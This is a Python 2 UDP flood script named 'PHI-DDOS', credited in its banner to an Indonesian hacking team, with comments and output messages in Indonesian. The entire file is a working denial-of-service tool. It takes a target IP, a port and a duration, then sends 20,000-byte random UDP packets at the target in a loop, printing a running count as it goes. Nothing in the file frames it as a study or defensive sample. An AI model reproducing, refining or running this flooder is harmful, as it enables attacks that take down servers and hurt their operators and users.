import time
import socket
import random
import sys
def usage():
    print "\033[1;32m############################################################"
    print "#-----------------------[\033[1;91mPHI-DDOS\033[1;32m]-----------------------#"
    print "#----------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 91mPHI-DDOS.py " "<ip> <port> <packet> \033[1;32m #"
    print "#                                                        ##"
    print "#\033[1;91mCreator:PythonNo.7  \033[1;32m##      #      #                     ##"
    print "#\033[1;91mTeam   : MCI        \033[1;32m##     #      #                     ##"
    print "#\033[1;91mVersion:1.0        \033[1;32m##      #      #                     ##"
    print "#\033[1;91mTQAdmin:MrPython7-MrRapwap-MrTheSpam-Mr.Lizard-MrBlackHat  ##"
    print "#\033[1;91m       :LikeWhite-MrPython99-MrPython-3-MrPython1-MrPython7 ##"
    print "#                     \033[1;91m ##     \033[1;32m#  \033[1;91m  \033[1;32   ##"
    print "#                     \033[1;91m##  \033[1;32m###   \033[1;91m  \033[1;32m   ##"
    print "#               \033[1;91m<--[PYTHON HACKREACK INDONESIA]-->         \033[1;32m  ##"
    print "############################################################"
    print "     Member:Mr.RAPWAB"
    print "           PembuatDdos1:MrPYTHON1 Cyber Team"
    print "          PembuatDdos2:PYTHON7"
def flood(victim, vport, duration):
    # Support And Enjoy :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

